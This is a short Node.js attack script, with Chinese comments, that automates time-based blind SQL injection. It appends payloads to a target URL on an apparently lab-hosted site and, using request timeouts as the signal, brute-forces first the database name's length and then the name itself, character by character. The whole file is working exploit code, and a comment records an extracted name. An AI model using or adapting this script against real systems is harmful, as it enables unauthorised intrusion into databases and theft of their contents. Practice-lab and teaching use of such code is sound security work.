const paloay = require('./payload')
const request = require('./request')


// const app_url = 'http://127.0.0.1:7001/sql/test?id=1'
const app_url = 'http://rhiq8003.ia.aqlab.cn/?id=1'


// 如何拼接payload，这个是简单的拼接
function payloadHandler (payload) {
  return `${app_url} and ${payload}`
}

// 数据库长度，先来 3_20 长度
function databaseLength (len = 20) {
  const listPromise = []
  for (let i = 3; i <= len; i++) {
    const pl = paloay.timeTamp.databaseLength(i)
    listPromise.push(
      request({
        url: payloadHandler(pl),
        timeout: paloay.sleepTime * 1000,
        headers: {
          'XCode': i
        }
      })
    )
  }
  // 利用超时请求的方法来实现
  Promise.all(listPromise).catch(e => {
    // 利用超时的方法实现
    if (e.message.indexOf('timeout') > -1) {
      console.log(e.config.headers.XCode)
    } else {
      console.log(e.message)
    }
  })
}


// 名称在 20-126 范围内
// 数据库名称
function databaseName(len, index=1) {
  for(let i = index; i <= len; i++) {
    const listPromise = []
    for (let j = 30; j < 127; j++){
      const pl = paloay.timeTamp.databaseName(j, i)
      listPromise.push(
        request({
          url: payloadHandler(pl),
          timeout: paloay.sleepTime * 1000,
          data: {
            code: i + '_' + String.fromCharCode(j)
          }
        })
      )
    }
    Promise.all(listPromise).catch(e => {
      if (e.message.indexOf('timeout') > -1) {
        console.log(e.config.data)
      }
    })
  }
}



// databaseLength()
// databaseName(7) // mHoshe
